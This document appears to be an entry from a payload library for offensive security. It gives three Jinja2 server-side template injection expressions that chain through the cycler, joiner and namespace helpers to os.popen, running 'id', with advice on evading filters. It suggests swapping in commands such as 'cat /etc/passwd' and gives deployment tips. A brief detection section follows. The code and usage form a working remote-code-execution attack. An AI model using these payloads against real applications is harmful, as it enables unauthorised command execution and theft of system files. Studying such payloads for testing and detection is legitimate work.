---
type: code
language: python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - ssti
  - jinja2
  - rce
  - os-popen
  - bypass
platforms:
  - Web
  - Linux
validated: true
---

# Jinja2-SSTI-Context-Cycler-Joiner-Namespace-os-popen-id

## Code

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

## Description

This payload uses Jinja2's internal context objects (cycler, joiner, namespace) to chain to globals and os, executing 'id' via os.popen multiple times. It bypasses filters blocking direct self or builtins access by leveraging template helpers.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'id' | Command executed in each popen call | 'id', 'uname -a', 'cat /etc/passwd' |

## Usage

Deploy in applications with restricted SSTI paths. The multi-line injection ensures redundancy; if one chain fails, others may succeed. Capture concatenated outputs for verification.

## Detection

- Template logs showing access to _TemplateReference__context or helper objects.
- Multiple identical command outputs in responses indicating chained execution.
- Anomaly detection in web traffic for long attribute chains.

## Related

- [[procedures/Jinja2-Server-Side-Template-Injection-with-os-popen-read]]
